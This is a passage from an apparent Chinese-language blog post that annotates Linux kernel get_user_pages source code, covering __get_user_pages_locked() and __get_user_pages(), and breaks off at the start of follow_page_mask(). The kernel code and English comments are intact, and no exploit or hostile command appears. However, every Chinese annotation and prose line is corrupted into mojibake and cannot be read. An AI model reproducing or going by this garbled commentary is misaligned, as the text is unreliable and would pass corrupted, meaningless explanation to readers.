nr_pages, write, force,<br>				       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>,<br>				       FOLL_TOUCH | FOLL_REMOTE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>get_user_pages_remote()</code>æ˜¯å¯¹<code>__get_user_pages_locked()</code>çš„åŒ…è£…</p>
<h4 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked()"></a>__get_user_pages_locked()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<span class="hljs-comment">//è¿›è¡Œç¼ºé¡µè®¡æ•°çš„</span><br>						<span class="hljs-keyword">struct</span> mm_struct *mm,	<span class="hljs-comment">//ç›®æ ‡è™šæ‹Ÿå†…å­˜åœ°å€</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,	<span class="hljs-comment">//èµ·å§‹åœ°å€</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,	<span class="hljs-comment">//é”å®šå¤šå°‘é¡µ</span><br>						<span class="hljs-type">int</span> write, 			   <span class="hljs-comment">//æ˜¯å¦éœ€è¦å†™å…¥</span><br>                          <span class="hljs-type">int</span> force,			 <span class="hljs-comment">//æ˜¯å¦å¼ºåˆ¶é”å®š</span><br>						<span class="hljs-keyword">struct</span> page **pages,    <span class="hljs-comment">//é”å®šé¡µé¢çš„æŒ‡é’ˆæ•°ç»„</span><br>						<span class="hljs-keyword">struct</span> vm_area_struct **vmas,	<span class="hljs-comment">//è¢«é”å®šé¡µé¢å¯¹åº”çš„VMAæ•°ç»„æŒ‡é’ˆ</span><br>						<span class="hljs-type">int</span> *locked, 			<span class="hljs-comment">//æ˜¯å¦ä½¿ç”¨VM_FAULT_RETRYçš„åŠŸèƒ½ï¼Œè®¾ä¸ºNULL</span><br>                          <span class="hljs-type">bool</span> notify_drop,		   <span class="hljs-comment">//ä¸è¿›è¡Œé€šçŸ¥ï¼Œè®¾ä¸ºfalse</span><br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)		<span class="hljs-comment">//æ ‡å¿—</span><br>&#123;<br>	<span class="hljs-type">long</span> ret, pages_done;<br>	<span class="hljs-type">bool</span> lock_dropped;<br><br>	<span class="hljs-keyword">if</span> (locked) &#123;<br>		<span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>		BUG_ON(vmas);<br>		<span class="hljs-comment">/* check caller initialized locked */</span><br>		BUG_ON(*locked != <span class="hljs-number">1</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (pages)<span class="hljs-comment">//å¦‚æœéœ€è¦è·å–é¡µé¢ï¼Œè®¾ç½®FILL_GETæ ‡å¿—</span><br>		flags |= FOLL_GET;<br>	<span class="hljs-keyword">if</span> (write)<span class="hljs-comment">//å¦‚æœéœ€è¦å†™å…¥ï¼Œè®¾ç½®FOLL_WRITEæ ‡å¿—</span><br>		flags |= FOLL_WRITE;<br>	<span class="hljs-keyword">if</span> (force)<span class="hljs-comment">//æ˜¯å¦å¼ºåˆ¶é”å®š</span><br>		flags |= FOLL_FORCE;<br><br>	pages_done = <span class="hljs-number">0</span>;<br>	lock_dropped = <span class="hljs-literal">false</span>;<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>				       vmas, locked);<br>		<span class="hljs-keyword">if</span> (!locked)<span class="hljs-comment">//å¦‚æœVM_FAULT_RETRYæ— æ³•è§¦å‘ï¼Œå°±ç›´æ¥è¿”å›</span><br>			<span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br>			<span class="hljs-keyword">return</span> ret;<br><br>		<span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br>		<span class="hljs-keyword">if</span> (!*locked) &#123;<br>			BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>			BUG_ON(ret &gt;= nr_pages);<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!pages)<br>			<span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br>			<span class="hljs-keyword">return</span> ret;<br><br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>			nr_pages -= ret;<br>			pages_done += ret;<br>			<span class="hljs-keyword">if</span> (!nr_pages)<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (*locked) &#123;<br>			<span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>		pages += ret;<br>		start += ret &lt;&lt; PAGE_SHIFT;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment">		 * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment">		 * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment">		 */</span><br>		*locked = <span class="hljs-number">1</span>;<br>		lock_dropped = <span class="hljs-literal">true</span>;<br>		down_read(&amp;mm-&gt;mmap_sem);<br>		ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>				       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>			BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		nr_pages--;<br>		pages_done++;<br>		<span class="hljs-keyword">if</span> (!nr_pages)<br>			<span class="hljs-keyword">break</span>;<br>		pages++;<br>		start += PAGE_SIZE;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment">		 * and so the critical section protected by it was lost.</span><br><span class="hljs-comment">		 */</span><br>		up_read(&amp;mm-&gt;mmap_sem);<br>		*locked = <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨åˆ°<code>__get_user_pages()</code></p>
<h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages()"></a>__get_user_pages()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __get_user_pages() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:	task_struct of target task</span><br><span class="hljs-comment"> * @mm:		mm_struct of target mm</span><br><span class="hljs-comment"> * @start:	starting user address</span><br><span class="hljs-comment"> * @nr_pages:	number of pages from start to pin</span><br><span class="hljs-comment"> * @gup_flags:	flags modifying pin behaviour</span><br><span class="hljs-comment"> * @pages:	array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *		Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *		only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:	array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *		Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> * @nonblocking: whether waiting for disk IO or mmap_sem contention</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held.  It may be released.  See below.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * __get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * __get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @gup_flags &amp; FOLL_WRITE == 0, the page must not be written to. If</span><br><span class="hljs-comment"> * the page is written to, set_page_dirty (or set_page_dirty_lock, as</span><br><span class="hljs-comment"> * appropriate) must be called after the page is finished with, and</span><br><span class="hljs-comment"> * before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @nonblocking != NULL, __get_user_pages will not wait for disk IO</span><br><span class="hljs-comment"> * or mmap_sem contention, and if waiting is needed to pin all pages,</span><br><span class="hljs-comment"> * *@nonblocking will be set to 0.  Further, if @gup_flags does not</span><br><span class="hljs-comment"> * include FOLL_NOWAIT, the mmap_sem will be released via up_read() in</span><br><span class="hljs-comment"> * this case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A caller using such a combination of @nonblocking and @gup_flags</span><br><span class="hljs-comment"> * must therefore hold the mmap_sem for reading only, and recognize</span><br><span class="hljs-comment"> * when it&#x27;s been released.  Otherwise, it must be held for either</span><br><span class="hljs-comment"> * reading or writing and will not be released.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In most cases, get_user_pages or get_user_pages_fast should be used</span><br><span class="hljs-comment"> * instead of __get_user_pages. __get_user_pages should be used only if</span><br><span class="hljs-comment"> * you need some special @gup_flags.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*	</span><br><span class="hljs-comment">	__get_user_pages()-æŠŠç”¨æˆ·é¡µé¢å›ºå®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">	@tskï¼šç›®æ ‡è¿›ç¨‹</span><br><span class="hljs-comment">	@mmï¼šç›®æ ‡å†…å­˜ç©ºé—´</span><br><span class="hljs-comment">	@startï¼šèµ·å§‹ç”¨æˆ·åœ°å€</span><br><span class="hljs-comment">	@nr_pagesï¼šé”å®šå¤šå°‘é¡µé¢</span><br><span class="hljs-comment">	@gup_flagsï¼šæ§åˆ¶get user pagesçš„è¡Œä¸ºæ ‡å¿—</span><br><span class="hljs-comment">	@pagesï¼šæ¥å—è¢«é”å®šé¡µé¢æŒ‡é’ˆçš„æŒ‡é’ˆæ•°ç»„ï¼Œæœ€å°‘è¦èƒ½ä¿å­˜nr_pagesä¸ªæŒ‡é’ˆ</span><br><span class="hljs-comment">	@vmasï¼šä¸€ä¸ªVMAæŒ‡é’ˆæ•°ç»„ï¼Œç”¨äºå­˜æ”¾æ¯ä¸€ä¸ªé¡µé¢å¯¹åº”çš„VMAå¯¹è±¡</span><br><span class="hljs-comment">	@nonblockingï¼šæ˜¯å¦ç­‰å¾…ç£ç›˜IOæˆ–è€…mmap_semç«äº‰</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br>		<span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br>&#123;<br>	<span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<span class="hljs-comment">//æ ¹æ®é¡µé¢å¤§å°è®¾ç½®æ©ç </span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (!nr_pages)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">		â€”â€”ï¼ï¼pages:ç­‰ä»·äºpages!=0ï¼Œè¡¨ç¤ºpagesæ˜¯å¦ä¸ºä¸€ä¸ªéç©ºæŒ‡é’ˆ</span><br><span class="hljs-comment">		â€”â€”ï¼ï¼(gup_flags &amp; FOLL_GET):ç­‰ä»·äºgup_flags &amp; FOLL_GETï¼=0ï¼Œæ ‡å¿—æ˜¯å¦è®¾ç½®FOLL_GETæ ‡å¿—</span><br><span class="hljs-comment">		â€”â€”åªè¦è¿™ä¸¤ä¸ªæ¡ä»¶ä¸åƒç­‰å°±ä¼šå‡ºbug</span><br><span class="hljs-comment">			è¦ä¹ˆpagesæ˜¯ä¸ªç©ºæŒ‡é’ˆï¼Œgup_flagsæ²¡è®¾ç½®FOLL_GETæ ‡å¿—ï¼Œä¸éœ€è¦è·å–é¡µé¢</span><br><span class="hljs-comment">			è¦ä¹ˆpageså­˜åœ¨ï¼Œgup_flagsè®¾ç½®äº†FOLL_GETæ ‡å¿—ï¼Œéœ€è¦è·å–é¡µé¢*/</span><br>	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment">	 * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment">	 * using the address space</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br>		gup_flags |= FOLL_NUMA;<br>    <br>	<span class="hljs-comment">//é€šè¿‡ä¸€ä¸ªdo&#123;...&#125;while(nr_pages)å¾ªç¯, éå†æ‰€æœ‰éœ€è¦é”å®šçš„é¡µ, å¤„ç†ä¸€ä¸ªé¡µä¹‹å‰, å…ˆæ‰¾åˆ°æ‰€å±çš„VMA</span><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> foll_flags = gup_flags;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_increm;<br>		<br>        <span class="hljs-comment">//å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œæˆ–è€…è·¨è¶Šäº†VMAçš„è¾¹ç•Œ</span><br>		<span class="hljs-comment">/* first iteration or cross vma bound */</span><br>		<span class="hljs-keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;<br>			vma = find_extend_vma(mm, start);<span class="hljs-comment">//å¯»æ‰¾åŒ…å«startçš„VMAå¯¹è±¡</span><br>			<span class="hljs-keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;<span class="hljs-comment">//å¯»æ‰¾å‡ºé”™</span><br>				<span class="hljs-type">int</span> ret;<br>				ret = get_gate_page(mm, start &amp; PAGE_MASK,<br>						gup_flags, &amp;vma,<br>						pages ? &amp;pages[i] : <span class="hljs-literal">NULL</span>);<br>				<span class="hljs-keyword">if</span> (ret)<br>					<span class="hljs-keyword">return</span> i ? : ret;<br>				page_mask = <span class="hljs-number">0</span>;<br>				<span class="hljs-keyword">goto</span> next_page;<br>			&#125;<br>			<span class="hljs-comment">//çŸ­è·¯æµ‹è¯•ï¼šå¦‚æœvmaä¸ä¸ºNULLï¼Œé‚£å°±ä¼šæ‰§è¡Œcheck_vma_flags(vma, gup_flags)æ£€æŸ¥ä¸‹vmaçš„æƒé™æ˜¯æ»¡è¶³gup_flagsçš„è¦æ±‚</span><br>			<span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br>				<span class="hljs-keyword">return</span> i ? : -EFAULT;<br>			<span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<span class="hljs-comment">//å¯¹äºå¤§TLBçš„é¡µé¢ï¼Œè°ƒç”¨follow_hugetlb_page()å¤„ç†</span><br>				i = follow_hugetlb_page(mm, vma, pages, vmas,<br>						&amp;start, &amp;nr_pages, i,<br>						gup_flags);<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br>		&#125;<br>retry:<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment">		 * potentially allocating memory.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">/*__get_user_pages()æœ€æ ¸å¿ƒçš„éƒ¨åˆ†, å°±æ˜¯ä¸‹é¢è¿™ä¸ªå¾ªç¯, follow_page_mask()åˆ¤æ–­å¯¹åº”é¡µæ˜¯å¦æ»¡è¶³foll_flagsè¦æ±‚, faultin_page()è´Ÿè´£å¤„ç†é”™è¯¯, ä¼šä¸€ç›´å¾ªç¯åˆ°å¯¹åº”é¡µæ»¡è¶³foll_flagsçš„è¦æ±‚*/</span><br>        <span class="hljs-comment">//å¦‚æœæœ‰å¾…å¤„ç†çš„SIGKILLï¼Œå°±ç›´æ¥ç»“æŸ</span><br>		<span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br>			<span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>		cond_resched();<span class="hljs-comment">//è°ƒåº¦æ‰§è¡Œåˆ«çš„ä»»åŠ¡</span><br>        <span class="hljs-comment">//æ ¹æ®foll_flagsçš„è¦æ±‚è¿½è¸ªvmaä¸­startå¯¹åº”çš„é¡µï¼Œå¦‚æœä¸èƒ½æ»¡è¶³è¦æ±‚æˆ–è€…é¡µä¸å­˜åœ¨ï¼Œå°±è¿”å›NULL</span><br>		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br>		<span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">//ç¼ºé¡µå¼‚å¸¸å¤„ç†</span><br>			<span class="hljs-type">int</span> ret;<br>            <span class="hljs-comment">//faultin_page()ä¼šå¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œå¤„ç†å®Œæ¯•åä¼šè¿”å›0</span><br>			ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br>					nonblocking);<br>			<span class="hljs-keyword">switch</span> (ret) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>				<span class="hljs-keyword">goto</span> retry;<span class="hljs-comment">//ç¼ºé¡µå¼‚å¸¸å¤„ç†å®Œæ¯•ï¼Œå†æ¬¡å°è¯•è¿½è¸ªé¡µï¼Œçœ‹æœ‰æ— ç¼ºé¡µå¼‚å¸¸å‘ç”Ÿ</span><br>			<span class="hljs-keyword">case</span> -EFAULT:<span class="hljs-comment">//å¤„ç†ç¼ºé¡µå¼‚å¸¸æ—¶å‘é€ï¼Œå¤„ç†ç»ˆæ­¢</span><br>			<span class="hljs-keyword">case</span> -ENOMEM:<br>			<span class="hljs-keyword">case</span> -EHWPOISON:<br>				<span class="hljs-keyword">return</span> i ? i : ret;<br>			<span class="hljs-keyword">case</span> -EBUSY:<br>				<span class="hljs-keyword">return</span> i;<br>			<span class="hljs-keyword">case</span> -ENOENT:<span class="hljs-comment">//å¼‚å¸¸å¤„ç†å®Œæ¯•ï¼Œåªæ˜¯æ²¡æœ‰å¯¹åº”çš„é¡µæè¿°ç¬¦ï¼Œå¤„ç†ä¸‹ä¸€é¡µ</span><br>				<span class="hljs-keyword">goto</span> next_page;<br>			&#125;<br>			BUG();<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment">			 * struct page.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">goto</span> next_page;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br>			<span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>		&#125;<br>        <span class="hljs-comment">//å¤„ç†å®Œè¿™ä¸ªé¡µä¹‹å, è®°å½•ç»“æœ, ç„¶åå¤„ç†ä¸‹ä¸€ä¸ªé¡µ</span><br>		<span class="hljs-keyword">if</span> (pages) &#123;<span class="hljs-comment">//è®°å½•é”å®šçš„é¡µ</span><br>			pages[i] = page;<br>			flush_anon_page(vma, page, start);<br>			flush_dcache_page(page);<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>next_page:<br>		<span class="hljs-keyword">if</span> (vmas) &#123;<span class="hljs-comment">//è®°å½•é¡µå¯¹åº”çš„vma</span><br>			vmas[i] = vma;<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>		page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br>		<span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>			page_increm = nr_pages;<br>		i += page_increm;<span class="hljs-comment">//å¤„ç†äº†å¤šå°‘é¡µ</span><br>		start += page_increm * PAGE_SIZE;<span class="hljs-comment">//ä¸‹ä¸€ä¸ªå¤„ç†çš„åœ°å€</span><br>		nr_pages -= page_increm;<span class="hljs-comment">//è¿˜å‰©å¤šå°‘é¡µ</span><br>	&#125; <span class="hljs-keyword">while</span> (nr_pages);<br>	<span class="hljs-keyword">return</span> i;<br>&#125;<br>EXPORT_SYMBOL(__get_user_pages);<br></code></pre></td></tr></table></figure>

<h4 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask()"></a>follow_page_mask()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 